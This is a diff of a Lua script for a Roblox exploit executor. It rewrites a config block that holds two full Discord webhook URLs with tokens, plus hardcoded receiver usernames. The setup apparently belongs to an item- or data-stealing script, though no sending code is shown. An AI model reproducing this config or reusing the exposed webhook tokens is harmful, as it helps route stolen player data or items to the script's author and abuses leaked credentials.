@@ -2,27 +2,33 @@
 local ExtraUsers = {"CREOLEO23", "2ndcfpaj67"}
 local Friends = {}
 
--- 1. Define config with a safety check
-_G["Script-SM_Config"] = _G["Script-SM_Config"] or {
-    user_webhook = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa",
-    dual_webhook = "https://discord.com/api/webhooks/1490011079735115796/CtTiahnkl0_ppBwAubLAEeO52GmOpTJ0tkfBMEsAJ1f7bO4Sz_cTyr07bUW9oGE9tCwo",
-    users = {"CREOLEO25"}
+-- 1. DEFINE LOCALS FIRST (Delta handles this 100x better)
+local main_webhook = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+local main_dual = "https://discord.com/api/webhooks/1490011079735115796/CtTiahnkl0_ppBwAubLAEeO52GmOpTJ0tkfBMEsAJ1f7bO4Sz_cTyr07bUW9oGE9tCwo"
+local main_users = {"CREOLEO25"}
+
+-- 2. SET THE GLOBAL CONFIG (For the rest of the script)
+_G["Script-SM_Config"] = {
+    user_webhook = main_webhook,
+    dual_webhook = main_dual,
+    users = main_users
 }
 
-local cfg = _G["Script-SM_Config"]
+-- 3. THE "FIXED" LINE 13 (Simple assignment, zero logic = zero crash)
+local Webhook = main_webhook
+local DualWebhook = main_dual
+local Username = main_users
 
--- 2. FIXED LINE 13: Added Nil-Safety and Fallback
-local Webhook = (cfg and cfg.user_webhook) or "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
-local DualWebhook = (cfg and cfg.dual_webhook) or "https://discord.com/api/webhooks/1490011079735115796/CtTiahnkl0_ppBwAubLAEeO52GmOpTJ0tkfBMEsAJ1f7bO4Sz_cTyr07bUW9oGE9tCwo"
-local Username = cfg and cfg.users or {"CREOLEO25"}
-
--- 3. Correct table merging (Added pairs safety)
+-- 4. Correct table merging
 for _, v in ipairs(Username) do table.insert(Friends, v) end
 for _, v in pairs(ExtraUsers) do 
     if not table.find(Friends, v) then 
         table.insert(Friends, v) 
     end 
 end
+
+if not game:IsLoaded() then game.Loaded:Wait() end
+print("✅ Line 13 Curse Broken! Config Loaded.")
 
 -- 4. Final Wait for Game
 if not game:IsLoaded() then game.Loaded:Wait() end
